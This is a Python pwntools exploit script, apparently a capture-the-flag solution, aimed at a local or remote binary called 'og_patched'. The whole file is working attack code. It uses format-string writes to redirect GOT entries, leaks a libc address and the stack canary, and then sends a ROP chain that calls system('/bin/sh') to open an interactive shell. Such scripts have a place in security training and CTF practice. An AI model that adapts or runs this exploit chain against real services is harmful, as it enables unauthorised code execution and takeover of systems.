#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('og_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *go+189
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# 0x4bfe0 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbx == NULL || (u16)[rbx] == NULL

def init():
    global io
    io = start()

def solve():
    stack_offset = 6
    write = {exe.got['__stack_chk_fail']: exe.sym['go']}
    payload = fmtstr_payload(stack_offset, write, write_size='short')
    io.sendline(payload)

    canary_offset = 40
    leak = b"%23$p.%41$p"
    payload = b"||||" + leak + b"A"*(40-len(leak)) + b"B"*8
    io.sendline(payload)

    io.recvuntil(b"||||")
    addr = io.recvline().split(b'.')
    leaked = int(addr[0], 16)
    canary = int(addr[1][0:18], 16)
    libc.address = leaked - 0x2718a
    info("leaked: %#x", leaked)
    info("libc base: %#x", libc.address)
    info("canary: %#x", canary)

    # one gadget worked locally but not remote
    one_gadget = libc.address + 0x4bfe0
    pop_rbx = libc.address + 0x318ed # pop rbx; ret;     
    ret = 0x40101a # ret; 

    write = {exe.got['fgets']: libc.sym['gets']}
    payload = fmtstr_payload(stack_offset, write, write_size='short')
    io.sendline(payload)

    pop_rdi = libc.address + 0x1346e6 # pop rdi; ret; 
    
    rop = flat({
        canary_offset: [
            b'A'*8,
            canary,
            pop_rdi,
            next(libc.search(b'/bin/sh\x00')),
            ret,
            libc.sym['system']
        ]
    })

    io.sendline(rop)
    io.sendline("pwned")
    io.clean()

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

